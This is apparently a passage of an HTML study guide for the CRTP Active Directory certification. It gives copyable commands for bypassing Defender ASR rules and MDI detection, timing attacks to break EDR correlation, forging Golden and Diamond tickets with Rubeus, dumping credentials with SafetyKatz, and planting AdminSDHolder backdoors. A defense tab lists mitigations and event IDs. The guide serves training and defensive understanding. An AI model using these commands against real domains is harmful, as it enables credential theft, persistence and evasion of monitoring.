+      <div class="card-desc"><strong>ASR (Attack Surface Reduction) rules</strong> are MDE policies that block specific behaviors — like "Block process creations originating from PSExec and WMI commands." Each rule is implemented as a Lua script on the endpoint, and these scripts contain both monitored process lists AND exclusion lists. The bypass: one ASR rule that blocks PSExec/WMI lateral movement has a command-line exclusion for paths used by SCCM (<code>C:\Windows\ccm\systemtemp\</code>). Including this path in your command makes the rule skip enforcement.</div>
+      <div class="cmd"><span class="comment"># Instead of PSExec/WMI (blocked by ASR), use WSManWinRM:</span>
+<span class="tool">WSManWinRM.exe</span> eu-sql.eu.eurocorp.local <span class="string">"cmd /c notepad.exe C:\Windows\ccm\systemtemp\"</span><span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-green"><span class="alert-icon">✅</span><div>Including <code>C:\Windows\ccm\systemtemp\</code> in the command line bypasses the "Block process creations from PSExec/WMI" ASR rule. This path is in the GetCommandLineExclusions() list in the ASR .lua script.</div></div>
+      <div class="cmd"><span class="comment"># Standard winrs also bypasses ASR (not in monitored process list):</span>
+<span class="tool">winrs</span> <span class="flag">-r:</span>target cmd.exe<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Breaking Detection Chains <span class="tag tag-green">EDR Evasion</span></div>
+      <div class="card-desc">EDR products (including MDE) correlate events within a time window to build <strong>detection chains</strong> — e.g., "SQL Server process → whoami.exe → powershell download → LSASS access" within 5 minutes = alert. Breaking this chain disrupts automated detection. Additionally, specific processes are monitored for specific child process creation — <code>whoami.exe</code> spawned by <code>sqlservr.exe</code> is a known IOC, but <code>SET USERNAME</code> (a built-in CMD command) returns the same info without creating a child process.</div>
+      <div class="cmd"><span class="comment"># Instead of whoami.exe (flagged under sqlservr.exe):</span>
+SET USERNAME          <span class="comment"># Same output, no child process</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Insert benign SQL queries between offensive actions:</span>
+SELECT @@VERSION
+<span class="comment">-- Wait 10-15 minutes --</span>
+EXEC xp_cmdshell 'dir'<span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">⏱️</span><div><strong>Time delay strategy:</strong> Most EDR correlation windows are 5-10 minutes. Inserting legitimate-looking activity or simply waiting resets the correlation context, preventing the attack chain from being flagged as a single incident.</div></div>
+    </div>
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">MDI Bypass Reference Table</div>
+    <div class="card-desc"><strong>MDI (Microsoft Defender for Identity)</strong> is a sensor deployed on DCs that analyzes all LDAP queries, Kerberos traffic, and replication events. It knows what normal looks like and alerts on anomalies. The bypass strategy: <em>look like a DC</em> where possible, use non-LDAP protocols for recon, and stay off the DC's radar entirely.</div>
+    <div class="grid-2" style="margin-top:12px">
+      <table class="ref-table">
+        <tr><th>MDI Detection</th><th>Bypass Technique</th></tr>
+        <tr><td>LDAP recon (PowerView)</td><td>Use SOAPHound (ADWS port 9389) or AD Module — same data, no LDAP queries to DC</td></tr>
+        <tr><td>DCSync detection</td><td>Use PHS sync account (whitelisted) or forge DC identity in Golden/Diamond ticket</td></tr>
+        <tr><td>Golden ticket anomaly</td><td>Use DC$ identity + /sids:S-1-5-21-&lt;parent&gt;-516,S-1-5-9 — looks like DC-to-DC replication</td></tr>
+        <tr><td>BloodHound collection</td><td>Add --excludedcs flag, remove Session and LocalGroup collection methods</td></tr>
+        <tr><td>MS-DFSNM coercion</td><td>MDI detects this — use MS-RPRN (Print Spooler) or MS-WSP instead</td></tr>
+        <tr><td>Pass-the-Ticket anomaly</td><td>Use Diamond ticket (real TGT base) rather than Golden (forged)</td></tr>
+        <tr><td>Lateral movement detection</td><td>winrs is undetected by MDI (but MDE sees it); use over WMI/PSExec</td></tr>
+        <tr><td>Kerberoasting (enc downgrade)</td><td>Use /rc4opsec flag — only targets accounts that already support RC4 only</td></tr>
+      </table>
+      <div>
+        <div class="concept">
+          <div class="concept-title">MDI-Safe Golden Ticket Recipe</div>
+          <p>Forge as a <strong>DC computer account</strong> (dcorp-dc$), not Administrator. Set user ID to 1000 (not 500). Include both <strong>-516 and S-1-5-9 SIDs</strong> in sIDHistory. This makes the ticket look like a legitimate inter-DC replication authentication rather than a privilege escalation.</p>
+        </div>
+        <div class="cmd"><span class="comment"># MDI-safe — DC identity, Enterprise DC SIDs:</span>
+<span class="tool">Rubeus.exe</span> golden /aes256:&lt;krbtgt&gt; /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:&lt;child_SID&gt; /sids:S-1-5-21-&lt;parent&gt;-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt<span class="copy-hint">click to copy</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TAB 10: DEFENSE -->
+<div class="tab-panel" id="tab-10">
+  <div class="section-title"><span>🛡️</span> Detection & Defense</div>
+  <div class="section-subtitle">Mitigations · Event IDs · Protected Users · Credential Guard · Deception · Zero Trust</div>
+  <div class="section-desc">
+    The defensive section is included in CRTP because understanding defense is critical for red teamers — you need to know what your attacks trigger so you can avoid or time them. More importantly, CRTP teaches you to <strong>think like a defender</strong>: every attack has a corresponding mitigation, and understanding both sides makes you a more effective security professional. These are Microsoft's recommended mitigations specifically for the attacks covered in the course.
+  </div>
+
+  <div class="grid-3 mb">
+    <div class="card">
+      <div class="card-title">Protect Domain Admins <span class="tag tag-green">Core Hardening</span></div>
+      <div class="card-desc">The most impactful single change: <strong>reduce the DA blast radius</strong>. Every unnecessary DA login to a non-DC increases the risk of TGT theft. The "Cannot be delegated" flag prevents DA credentials from being forwarded by delegation attacks.</div>
+      <div class="pills">
+        <span class="pill">Minimum number of DAs</span>
+        <span class="pill">Never log DA into non-DC</span>
+        <span class="pill">No services running as DA</span>
+        <span class="pill">Set "Account cannot be delegated"</span>
+        <span class="pill">Add privileged users to Protected Users</span>
+        <span class="pill">Use separate accounts for admin tasks</span>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Protected Users Group <span class="tag tag-blue">Server 2012R2+</span></div>
+      <div class="card-desc">A special security group with hardcoded protections that <strong>cannot be configured away</strong> — they're enforced by the DC. Adding a user here instantly applies all protections. The 4-hour TGT limit means even a stolen TGT expires quickly. No NTLM means even a stolen hash can't be used directly.</div>
+      <table class="ref-table">
+        <tr><th>Protection</th><th>What it blocks</th></tr>
+        <tr><td>No CredSSP/WDigest</td><td>No cleartext password caching in memory</td></tr>
+        <tr><td>No NTLM</td><td>Hash theft → useless (hash not cached, no NTLM auth at DC)</td></tr>
+        <tr><td>No DES/RC4 Kerberos</td><td>Kerberoasting → only AES hashes (much harder to crack)</td></tr>
+        <tr><td>No delegation</td><td>Credential forwarding via delegation → blocked</td></tr>
+        <tr><td>TGT = 4 hours max</td><td>Stolen TGT expires in 4 hours regardless of domain setting</td></tr>
+      </table>
+    </div>
+
+    <div class="card">
+      <div class="card-title">LAPS / JIT / JEA <span class="tag tag-cyan">Privilege Reduction</span></div>
+      <div class="card-desc">Three complementary controls that reduce standing privilege across the domain:</div>
+      <div class="alert alert-blue" style="margin-bottom:6px"><span class="alert-icon">🔑</span><div><strong>LAPS</strong>: Each computer gets a unique, auto-rotated local admin password stored in AD. Stealing one machine's local admin hash doesn't work on all machines. Caveat: the <em>ms-mcs-AdmPwd</em> attribute is readable — enumerate who can read it.</div></div>
+      <div class="alert alert-blue" style="margin-bottom:6px"><span class="alert-icon">⏰</span><div><strong>JIT (Just-in-Time Admin)</strong>: Admin access is granted only when needed via Temporary Group Membership, with a defined expiry. No persistent DA membership.</div></div>
+      <div class="alert alert-blue"><span class="alert-icon">🎭</span><div><strong>JEA (Just Enough Admin)</strong>: PowerShell remoting with role-based constraints — users can only run specific cmdlets with specific parameters. Limits blast radius of compromised admin accounts.</div></div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Credential Guard <span class="tag tag-green">VBS Isolation</span></div>
+      <div class="card-desc"><strong>Credential Guard</strong> uses virtualization-based security (VBS) to run LSASS in an isolated environment called a Virtual Secure Mode (VSM) trustlet. NTLM hashes and Kerberos TGTs are stored in this isolated process — even SYSTEM can't read them directly. This makes PTH and OPTH significantly harder (though not impossible — there are bypass techniques via Kerberos delegation and DPAPI).</div>
+      <div class="alert alert-green"><span class="alert-icon">🔒</span><div><strong>What it protects:</strong> NTLM hashes in LSASS, Kerberos TGTs in LSASS. Pass-the-Hash and OPTH (credential material theft from LSASS) are effectively blocked.</div></div>
+      <div class="alert alert-orange"><span class="alert-icon">⚠️</span><div><strong>Limitations:</strong> Does NOT protect SAM hive (local accounts), LSA Secrets (service account passwords), or DPAPI. Cannot be enabled on DCs. Requires Windows 10 Enterprise / Server 2016+ with virtualization support.</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">WDAC / Device Guard <span class="tag tag-purple">Application Control</span></div>
+      <div class="card-desc"><strong>Windows Defender Application Control (WDAC)</strong> is Microsoft's application whitelisting solution. It enforces that only signed/approved code can execute. UMCI (User Mode Code Integrity) is the most impactful component — it blocks unsigned executables and PowerShell scripts in Constrained Language Mode, breaking most standard attack tools. Bypass requires LOLBAS (Living Off the Land Binaries And Scripts) — signed Microsoft binaries that can be abused.</div>
+      <div class="pills">
+        <span class="pill">CCI — Configurable Code Integrity</span>
+        <span class="pill">KMCI — Kernel mode enforcement</span>
+        <span class="pill">UMCI — User mode enforcement (most impactful)</span>
+        <span class="pill">UEFI Secure Boot — firmware protection</span>
+      </div>
+      <div class="alert alert-orange"><span class="alert-icon">💡</span><div><strong>Red team bypass:</strong> UMCI is bypassable via LOLBAS — e.g., csc.exe (C# compiler, signed by MS), MSBuild.exe, regsvr32, mshta. See <code>lolbas-project.github.io</code> for the complete list.</div></div>
+    </div>
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">Key Event IDs — What to Monitor</div>
+    <div class="card-desc">These are the most critical Windows Security events for detecting the attacks in this course. In CRTP lab, they appear in Windows Event Viewer and Windows Event Forwarding (WEF) collections. In real environments they're forwarded to a SIEM (Splunk, Sentinel, etc.).</div>
+    <div class="grid-2" style="margin-top:10px">
+      <table class="ref-table">
+        <tr><th>Event ID</th><th>Attack Detected</th><th>Key Filter</th></tr>
+        <tr><td><span class="eid">4769</span></td><td>Kerberoasting (TGS request)</td><td>Encryption type 0x17 = RC4 — anomaly if account should use AES</td></tr>
+        <tr><td><span class="eid">4768</span></td><td>AS-REP roasting / all TGT requests</td><td>Pre-auth disabled, or encryption type RC4</td></tr>
+        <tr><td><span class="eid">4624</span></td><td>All logon events</td><td>Logon type 3=network, 9=OPTH (sekurlsa::pth), 10=RemoteInteractive</td></tr>
+        <tr><td><span class="eid">4648</span></td><td>Explicit credential logon</td><td>RunAs, OPTH, PTH lateral movement indicator</td></tr>
+        <tr><td><span class="eid">4662</span></td><td>AD object access</td><td>GUID-based property access = Replication-Get-Changes (DCSync)</td></tr>
+        <tr><td><span class="eid">4742</span></td><td>Computer account changed</td><td>RBCD attack — msDS-AllowedToActOnBehalfOfOtherIdentity modified</td></tr>
+      </table>
+      <table class="ref-table">
+        <tr><th>Event ID</th><th>Attack Detected</th><th>Key Filter</th></tr>
+        <tr><td><span class="eid">4776</span></td><td>NTLM credential validation</td><td>PTH attempts, NTLM relay, lateral movement</td></tr>
+        <tr><td><span class="eid">4625</span></td><td>Failed logon</td><td>Brute force, spray — many failures in short window</td></tr>
+        <tr><td><span class="eid">7045</span></td><td>New service installed</td><td>Skeleton key kernel driver, PSExec service creation</td></tr>
+        <tr><td><span class="eid">4104</span></td><td>Script block logging</td><td>PowerShell execution — obfuscation patterns, known malicious strings</td></tr>
+        <tr><td><span class="eid">4798</span></td><td>Local group membership queried</td><td>PowerView recon — Find-LocalAdminAccess pattern</td></tr>
+        <tr><td><span class="eid">5136</span></td><td>AD object modified</td><td>AdminSDHolder, GPO, or group changes by non-admin accounts</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Deception — Honey Accounts <span class="tag tag-yellow">Detection</span></div>
+      <div class="card-desc"><strong>Deception technology</strong> creates fake high-value objects that look real but trigger alerts when touched. The <strong>Deploy-Deception</strong> module creates users/computers that are configured to fire Event ID 4662 when accessed via LDAP — specifically via the property GUIDs that PowerView uses. Normal tools like <code>net user</code> or WMI queries don't trigger these events, so the alert is PowerView-specific and highly reliable.</div>
+      <div class="cmd"><span class="comment"># Create decoy user — fires 4662 when PowerView enumerates it:</span>
+<span class="tool">Create-DecoyUser</span> <span class="flag">-UserFirstName</span> user <span class="flag">-UserLastName</span> manager <span class="flag">-Password</span> Pass@123 | <span class="tool">Deploy-UserDeception</span> <span class="flag">-UserFlag</span> PasswordNeverExpires <span class="flag">-GUID</span> d07da11f-8a3d-42b6-b0aa-76c962be719a <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-yellow" style="color:var(--yellow);background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3)"><span class="alert-icon">🍯</span><div>Normal tools don't trigger 4662 because they use WMI/SamrQueryDisplayInformation, not LDAP with the specific property GUIDs. PowerView uses LDAP with those GUIDs → precise detection.</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Privileged Access Strategy — Zero Trust <span class="tag tag-blue">Current Guidance</span></div>
+      <div class="card-desc">Microsoft retired the <strong>ESAE/Red Forest</strong> model in 2021 (it was too complex for most orgs to implement properly). The current guidance is built on <strong>Zero Trust</strong> principles. The key shift: assume every component is potentially compromised, and verify every access request regardless of network location. The <em>Enterprise Access Model</em> replaces the old Tier 0/1/2 with three "planes" that map to modern hybrid cloud environments.</div>
+      <table class="ref-table">
+        <tr><th>Plane</th><th>What It Controls</th><th>Key Assets</th></tr>
+        <tr><td>Control Plane</td><td>Identity and access decisions</td><td>AD, Azure AD, Entra ID, CA policies</td></tr>
+        <tr><td>Management Plane</td><td>Administering and monitoring infrastructure</td><td>DCs, SCCM, SIEM, admin workstations</td></tr>
+        <tr><td>Data/Workload Plane</td><td>Applications, data, services</td><td>File servers, apps, databases, workloads</td></tr>
+      </table>
+      <div class="alert alert-blue" style="margin-top:8px"><span class="alert-icon">🔑</span><div><strong>Three Zero Trust principles:</strong> (1) Verify Explicitly — always authenticate/authorize based on all signals, (2) Least Privilege — limit user rights with JIT/JEA, (3) Assume Breach — minimize blast radius, verify end-to-end encryption.</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- TAB 11: QUICK REFERENCE -->
+<div class="tab-panel" id="tab-11">
+  <div class="section-title"><span>⚡</span> Quick Reference</div>
+  <div class="section-subtitle">Attack chain · Rubeus · SafetyKatz · PowerView · Ports · SIDs · Protected Groups</div>
+  <div class="section-desc">
+    Everything you need during an exam or engagement in one tab — no descriptions, just the facts. Use this when you know what you're doing and need a fast command lookup. The tables are ordered by what you'll use most frequently. <strong>Tip:</strong> Use the search bar at the top to jump to any command across all tabs instantly.
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">Full CRTP Attack Chain</div>
+    <div class="chain" style="margin:12px 0 8px">
+      <div class="chain-item">Foothold<br><small style="color:var(--text3)">domain user</small></div><div class="chain-arrow">→</div>
+      <div class="chain-item">Enumerate<br><small style="color:var(--text3)">BloodHound/PV</small></div><div class="chain-arrow">→</div>
+      <div class="chain-item">Local Admin<br><small style="color:var(--text3)">PowerUp/Jenkins</small></div><div class="chain-arrow">→</div>
+      <div class="chain-item hi">Cred Dump<br><small style="color:var(--accent3)">SafetyKatz</small></div><div class="chain-arrow">→</div>
+      <div class="chain-item">Domain Admin<br><small style="color:var(--text3)">Delegation/DCSync</small></div><div class="chain-arrow">→</div>
+      <div class="chain-item hi">Persist<br><small style="color:var(--accent3)">Golden/AdminSDHolder</small></div><div class="chain-arrow">→</div>
+      <div class="chain-item">Enterprise Admin<br><small style="color:var(--text3)">sIDHistory/AD CS</small></div>
+    </div>
+    <table class="ref-table" style="margin-top:8px">
+      <tr><th>Phase</th><th>Primary Tools</th><th>Key Techniques</th><th>Goal</th></tr>
+      <tr><td>Tradecraft</td><td>Invisi-Shell, AMSITrigger, NetLoader</td><td>Bypass logging, AMSI, AV signatures</td><td>Clean working environment</td></tr>
+      <tr><td>Enumeration</td><td>PowerView, BloodHound, SOAPHound</td><td>Map domain, find attack paths</td><td>Know the environment</td></tr>
+      <tr><td>Local PrivEsc</td><td>PowerUp, Jenkins, GPOddity</td><td>Service misconfigs, feature abuse</td><td>Local admin on one machine</td></tr>
+      <tr><td>Lateral Movement</td><td>PSRemoting, winrs, SafetyKatz</td><td>PTH, OPTH, credential extraction</td><td>Expand access, find DA</td></tr>
+      <tr><td>Domain PrivEsc</td><td>Rubeus, SafetyKatz</td><td>Kerberoasting, delegation, DCSync</td><td>Domain Admin</td></tr>
+      <tr><td>Persistence</td><td>Rubeus, SafetyKatz, RACE</td><td>Golden/Diamond, AdminSDHolder, DSRM</td><td>Survive remediation</td></tr>
+      <tr><td>Cross Trust</td><td>Rubeus, SafetyKatz, Certify</td><td>sIDHistory, trust keys, AD CS</td><td>Enterprise Admin</td></tr>
+    </table>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Rubeus Command Reference <span class="tag tag-blue">Rubeus.exe</span></div>
+      <table class="ref-table">
+        <tr><th>Command</th><th>Purpose</th></tr>
+        <tr><td>asktgt /user:X /rc4:Y /ptt</td><td>TGT from NTLM hash (no elevation)</td></tr>
+        <tr><td>asktgt /user:X /aes256:Y /opsec /createnetonly:cmd /show /ptt</td><td>TGT from AES — opsec mode (elevation needed)</td></tr>
+        <tr><td>kerberoast /stats</td><td>Count Kerberoastable accounts + enc types</td></tr>
+        <tr><td>kerberoast /user:X /simple</td><td>Roast specific user</td></tr>
+        <tr><td>kerberoast /rc4opsec /outfile:h.txt</td><td>Roast RC4-only accounts (MDI bypass)</td></tr>
+        <tr><td>asreproast /user:X /outfile:h.txt</td><td>AS-REP roast — no preauth users</td></tr>
+        <tr><td>monitor /interval:5 /nowrap</td><td>Watch for new TGTs (unconstrained deleg)</td></tr>
+        <tr><td>ptt /ticket:&lt;base64&gt;</td><td>Inject Kerberos ticket into session</td></tr>
+        <tr><td>golden /aes256:X /sid:Y /ldap /user:Z /ptt</td><td>Forge Golden TGT</td></tr>
+        <tr><td>silver /service:X /rc4:Y /sid:Z /ldap /user:A /ptt</td><td>Forge Silver TGS for service</td></tr>
+        <tr><td>diamond /krbkey:X /tgtdeleg /ticketuser:Z /ptt</td><td>Diamond ticket — opsec-safe Golden</td></tr>
+        <tr><td>s4u /user:X /aes256:Y /msdsspn:Z /impersonateuser:A /ptt</td><td>S4U2proxy — constrained delegation</td></tr>
+        <tr><td>s4u ... /altservice:ldap</td><td>SPN substitution for DCSync via delegation</td></tr>
+        <tr><td>asktgs /service:X /ticket:Y /ptt</td><td>Exchange inter-realm TGT for actual TGS</td></tr>
+      </table>
+    </div>
+
+    <div class="card">
+      <div class="card-title">SafetyKatz Command Reference <span class="tag tag-red">SafetyKatz.exe</span></div>
+      <table class="ref-table">
+        <tr><th>Command / Arguments</th><th>Purpose</th></tr>
+        <tr><td>"sekurlsa::ekeys"</td><td>Dump AES + RC4 + other keys from LSASS</td></tr>
+        <tr><td>"sekurlsa::logonpasswords"</td><td>Dump plaintext + NT hashes (WDigest must be on)</td></tr>
+        <tr><td>"sekurlsa::tickets /export"</td><td>Export all Kerberos tickets to .kirbi files</td></tr>
+        <tr><td>"sekurlsa::pth /user:X /aes256:Y /run:cmd"</td><td>OverPass-the-Hash — spawn process with TGT</td></tr>
+        <tr><td>"lsadump::dcsync /user:X"</td><td>DCSync — get specific user's hash (no DC code exec)</td></tr>
+        <tr><td>"lsadump::dcsync /user:X /domain:Y"</td><td>DCSync against a different domain</td></tr>
+        <tr><td>"lsadump::lsa /patch"</td><td>Dump all hashes from DC (requires code exec on DC)</td></tr>
+        <tr><td>"lsadump::trust /patch"</td><td>Dump trust keys (inter-realm shared secrets)</td></tr>
+        <tr><td>"token::elevate" "lsadump::sam"</td><td>Dump SAM hive — local accounts + DSRM hash</td></tr>
+        <tr><td>"kerberos::golden /user:X /krbtgt:Y /ptt"</td><td>Forge Golden ticket (Mimikatz syntax)</td></tr>
+        <tr><td>"kerberos::ptt ticket.kirbi"</td><td>Inject .kirbi ticket file</td></tr>
+        <tr><td>"misc::skeleton"</td><td>Skeleton key — patch DC lsass (universal password)</td></tr>
+        <tr><td>"misc::memssp"</td><td>Inject custom SSP — logs all local logon creds</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">PowerView Quick Reference <span class="tag tag-purple">PowerView</span></div>
+      <table class="ref-table">
+        <tr><th>Command</th><th>Purpose</th></tr>
+        <tr><td>Get-DomainSID</td><td>Domain SID — needed for all ticket forging</td></tr>
+        <tr><td>Get-DomainUser -SPN</td><td>Find Kerberoastable service accounts</td></tr>
+        <tr><td>Get-DomainUser -PreauthNotRequired</td><td>Find AS-REP roastable accounts</td></tr>
+        <tr><td>Get-DomainComputer -UnConstrained</td><td>Machines with unconstrained delegation</td></tr>
+        <tr><td>Get-DomainUser -TrustedToAuth</td><td>Users with constrained delegation</td></tr>
+        <tr><td>Get-DomainComputer -TrustedToAuth</td><td>Computers with constrained delegation</td></tr>
+        <tr><td>Find-InterestingDomainAcl -ResolveGUIDs</td><td>Find exploitable ACEs (GenericAll, WriteDACL...)</td></tr>
+        <tr><td>Find-LocalAdminAccess -Verbose</td><td>Where current user is local admin</td></tr>
+        <tr><td>Find-DomainUserLocation -Verbose</td><td>Where DA currently has a session</td></tr>
+        <tr><td>Get-DomainTrust</td><td>All domain trusts</td></tr>
+        <tr><td>Add-DomainObjectAcl -Rights DCSync</td><td>Grant DCSync rights to a user</td></tr>
+        <tr><td>Add-DomainObjectAcl -Rights All -TargetIdentity AdminSDHolder</td><td>AdminSDHolder backdoor</td></tr>
+        <tr><td>Set-DomainObject -XOR @{uac=4194304}</td><td>Disable Kerberos preauth on account</td></tr>
+        <tr><td>Set-DomainObject -Set @{serviceprincipalname='X'}</td><td>Set SPN for targeted Kerberoasting</td></tr>
+      </table>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Ports & Well-Known SIDs</div>
+      <table class="ref-table" style="margin-bottom:10px">
+        <tr><th>Port</th><th>Service</th><th>Used By</th></tr>
+        <tr><td>88</td><td>Kerberos</td><td>All Kerberos attacks, Rubeus</td></tr>
+        <tr><td>135</td><td>RPC Endpoint Mapper</td><td>WMI, DCOM lateral movement</td></tr>
+        <tr><td>139 / 445</td><td>SMB</td><td>PSExec, share access, lateral movement</td></tr>
+        <tr><td>389 / 636</td><td>LDAP / LDAPS</td><td>PowerView, BloodHound, LDAP recon</td></tr>
+        <tr><td>3268 / 3269</td><td>Global Catalog</td><td>Forest-wide LDAP searches</td></tr>
+        <tr><td>5985 / 5986</td><td>WinRM HTTP/HTTPS</td><td>PSRemoting, winrs, winrm</td></tr>
+        <tr><td>9389</td><td>ADWS</td><td>SOAPHound, AD Module, AD Web Services</td></tr>
+        <tr><td>1433</td><td>MSSQL</td><td>PowerUpSQL, SQL link attacks</td></tr>
+        <tr><td>8080</td><td>HTTP (alt)</td><td>Jenkins exploit</td></tr>
+      </table>
+      <table class="ref-table">
+        <tr><th>SID Suffix</th><th>Group / Identity</th></tr>
+        <tr><td class="sid">-500</td><td>Domain Administrator account</td></tr>
+        <tr><td class="sid">-512</td><td>Domain Admins</td></tr>
+        <tr><td class="sid">-513</td><td>Domain Users</td></tr>
+        <tr><td class="sid">-516</td><td>Domain Controllers</td></tr>
+        <tr><td class="sid">-519</td><td>Enterprise Admins (root domain only)</td></tr>
+        <tr><td class="sid">-520</td><td>Group Policy Creator Owners</td></tr>
+        <tr><td class="sid">S-1-5-9</td><td>Enterprise Domain Controllers (forest-wide)</td></tr>
+        <tr><td class="sid">S-1-5-18</td><td>Local System (SYSTEM)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">AdminSDHolder — Protected Groups</div>
+    <div class="card-desc">These groups are protected by SDProp — their ACLs are overwritten every 60 minutes to match the AdminSDHolder template. A backdoor on AdminSDHolder propagates to ALL of these groups automatically.</div>
+    <div class="pills" style="margin:10px 0">
+      <span class="pill">Domain Admins</span>
+      <span class="pill">Enterprise Admins</span>
+      <span class="pill">Schema Admins</span>
+      <span class="pill">Administrators</span>
+      <span class="pill">Account Operators</span>
+      <span class="pill">Backup Operators</span>
+      <span class="pill">Server Operators</span>
+      <span class="pill">Print Operators</span>
+      <span class="pill">Domain Controllers</span>
+      <span class="pill">Read-only Domain Controllers</span>
+      <span class="pill">Replicator</span>
+      <span class="pill">Cert Publishers</span>
+    </div>
+    <div class="alert alert-purple"><span class="alert-icon">⏰</span><div><strong>SDProp timing:</strong> Runs every 60 minutes on the PDC Emulator. Use <code>Invoke-SDPropagator</code> to trigger immediately. After propagation, your ACE applies to all listed groups simultaneously — add yourself to any of them using your GenericAll/GenericWrite right.</div></div>
+  </div>
+</div>
+
+
+
+
+
+</div><!-- end content -->
+</div><!-- end main -->
+
+<script>
+// Wrap all ref-tables in a scrollable div
+document.querySelectorAll('.ref-table').forEach(t => {
+  if (!t.parentElement.classList.contains('table-wrap')) {
+    const wrap = document.createElement('div');
+    wrap.className = 'table-wrap';
+    t.parentNode.insertBefore(wrap, t);
+    wrap.appendChild(t);
+  }
+});
+
+// Tab switching
+function switchTab(idx) {
+  document.querySelectorAll('.tab-panel').forEach((p,i) => {
+    p.classList.toggle('active', i === idx);
+  });
+  document.querySelectorAll('.tab-btn').forEach((b,i) => {
+    b.classList.toggle('active', i === idx);
+  });
+}
+
+// Copy to clipboard on cmd click
+document.querySelectorAll('.cmd').forEach(el => {
+  el.addEventListener('click', function() {
+    const text = this.innerText.replace(/click to copy$/,'').trim();
+    navigator.clipboard.writeText(text).then(() => {
+      this.classList.add('copied');
+      const hint = this.querySelector('.copy-hint');
+      if(hint) hint.textContent = '✓ Copied!';
+      setTimeout(() => {
+        this.classList.remove('copied');
+        if(hint) hint.textContent = 'click to copy';
+      }, 1800);
+    });
+  });
+});
+
+// Search
+function doSearch(query) {
+  const q = query.toLowerCase().trim();
+  document.querySelectorAll('.highlight-match').forEach(el => {
+    el.outerHTML = el.innerHTML;
+  });
+  if(!q) return;
+  
+  let firstMatch = null;
+  const panels = document.querySelectorAll('.tab-panel');
+  panels.forEach((panel, panelIdx) => {
+    const cmds = panel.querySelectorAll('.cmd');
+    let panelHasMatch = false;
+    cmds.forEach(cmd => {
+      const text = cmd.textContent.toLowerCase();
+      if(text.includes(q)) {
+        panelHasMatch = true;
+        if(!firstMatch) firstMatch = panelIdx;
+      }
+    });
+  });
+  
+  if(firstMatch !== null) {
+    switchTab(firstMatch);
+    setTimeout(() => {
+      const panel = document.getElementById('tab-' + firstMatch);
+      const cmds = panel.querySelectorAll('.cmd');
+      cmds.forEach(cmd => {
+        if(cmd.textContent.toLowerCase().includes(q)) {
+          cmd.scrollIntoView({behavior:'smooth', block:'center'});
+        }
+      });
+    }, 100);
+  }
+}
+
+// Progress bar on scroll
+window.addEventListener('scroll', () => {
+  const scrollPct = window.scrollY / (document.body.scrollHeight - window.innerHeight) * 100;
+  document.getElementById('prog').style.width = scrollPct + '%';
+});
+</script>
+</body>
+</html>
